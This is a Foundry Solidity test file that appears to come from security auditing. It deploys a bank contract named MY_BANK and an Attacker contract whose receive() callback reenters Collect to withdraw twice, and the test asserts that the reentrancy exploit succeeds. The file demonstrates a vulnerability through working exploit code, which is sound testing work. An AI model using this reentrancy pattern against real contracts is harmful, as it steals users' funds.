
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constraints:
        // 1. attackVal must be less than MinSum (1 ether) to demonstrate the bypass of the check in the second call.
        // 2. We need a deposit amount such that:
        //    - Deposit >= MinSum (to pass first check)
        //    - Deposit - attackVal < MinSum (so a secure contract would fail the second check)
        //    - Deposit >= 2 * attackVal (so the vulnerable contract doesn't underflow and revert)
        
        // Range: 0.1 ether to 0.4 ether
        attackVal = bound(attackVal, 0.1 ether, 0.4 ether);
        
        // Calculate deposit: 1 ether + (attackVal / 2)
        // Example: attackVal = 0.2 ETH. Deposit = 1.1 ETH.
        // Check 1: 1.1 >= 1.0 (Pass)
        // Check 2 (Secure): 1.1 - 0.2 = 0.9 < 1.0 (Fail)
        // Check 2 (Vulnerable): 1.1 >= 1.0 (Pass) -> Reentrancy Success
        // Underflow Check: 1.1 - 0.2 - 0.2 = 0.7 (Safe)
        uint256 depositVal = 1 ether + (attackVal / 2);

        vm.deal(address(_attacker), depositVal);
        
        // Setup: Deposit funds
        _attacker.setupAttack{value: depositVal}(depositVal);

        // Time Travel: Put sets unlockTime to block.timestamp. Collect requires block.timestamp > unlockTime.
        vm.warp(block.timestamp + 100);

        // Attack
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        _victim = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        attackCallCount = 0;
        initialBalance = address(this).balance;

        // Start the attack
        attackCallCount++;
        _victim.Collect(val);

        // Verify Success:
        // If reentrancy worked, we withdrew 'val' twice.
        if (address(this).balance == initialBalance + (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
